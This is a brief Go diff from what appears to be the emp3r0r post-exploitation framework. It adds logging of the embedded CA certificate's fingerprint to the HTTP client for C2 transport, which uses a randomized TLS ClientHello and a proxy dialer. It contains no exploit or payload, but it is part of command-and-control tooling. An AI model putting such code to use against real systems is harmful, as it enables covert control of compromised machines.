@@ -2,6 +2,7 @@ package tun
 
 import (
 	"crypto/x509"
+	"encoding/pem"
 	"log"
 	"net/http"
 	"net/url"
@@ -14,8 +15,6 @@ import (
 var (
 
 	// CACrt for TLS server cert signing
-	// fill our CA pem text when compiling
-	// taken care by build.py
 	CACrt = []byte(`
 [emp3r0r_ca]
 		`)
@@ -46,6 +45,11 @@ func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
 		InsecureSkipVerify: false,
 		RootCAs:            rootCAs,
 	}
+
+	// fingerprint of CA
+	block, _ := pem.Decode(CACrt)
+	ca_crt, _ := x509.ParseCertificate(block.Bytes)
+	log.Printf("CA cert fingerprint: %s", SHA256SumRaw(ca_crt.Raw))
 
 	// set proxyURL to nil to use direct connection for C2 transport
 	proxyDialer, err := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
